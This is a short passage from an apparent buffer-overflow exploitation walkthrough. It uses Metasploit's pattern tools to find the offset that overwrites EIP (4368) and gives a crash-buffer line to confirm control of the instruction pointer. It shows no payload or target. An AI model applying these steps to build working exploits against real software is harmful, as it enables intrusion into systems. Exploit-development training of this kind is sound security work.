Create a pattern using **msf-patter_create**

`msf-patter_create -l 4379`

Swap out the buffer and run PoC again. 

Now we can see the EIP overwritten with 46367046. 

Push this value into **msf-patter_offset** -q 46367046:
[*] Exact match at offset 4368

To confirm, update the crash variable to cleanly overwrite EIP with four "B" chars.

```
crash = "\x41" * 4368 + "B" * 4 + "C" * 7
```

